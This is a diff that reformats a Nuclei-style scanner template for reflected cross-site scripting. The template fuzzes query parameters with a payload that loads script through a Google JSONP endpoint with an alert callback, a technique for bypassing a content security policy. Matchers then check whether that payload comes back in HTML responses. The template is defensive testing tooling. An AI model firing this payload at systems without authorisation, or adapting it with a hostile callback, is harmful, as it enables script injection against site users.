@@ -1,36 +1,30 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xss}}'
+    mode: multiple
+    part: query
+    type: postfix
+  matchers:
+  - part: body
+    type: word
+    words:
+    - xss<script/src="https://www
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    xss:
+    - xss\"><script/src="https://www&#x2e;google&#x2e;com/complete/search?client=chrome&q=hello&callback=alert#1">"></script>
+  stop-at-first-match: true
 id: csp-xss
-
 info:
-  name: Reflected Cross Site Scripting
   author: reewardius
+  name: Reflected Cross Site Scripting
   severity: medium
   tags: fuzzing-xss,fuzzing-req,dast
-  
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-      
-    payloads:
-      xss:
-        - 'xss\"><script/src="https://www&#x2e;google&#x2e;com/complete/search?client=chrome&q=hello&callback=alert#1">"></script>'
-        
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: multiple
-        fuzz:
-          - "{{xss}}"
-          
-    stop-at-first-match: true
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'xss<script/src="https://www'
-          
-      - type: word
-        part: header
-        words:
-          - "text/html"
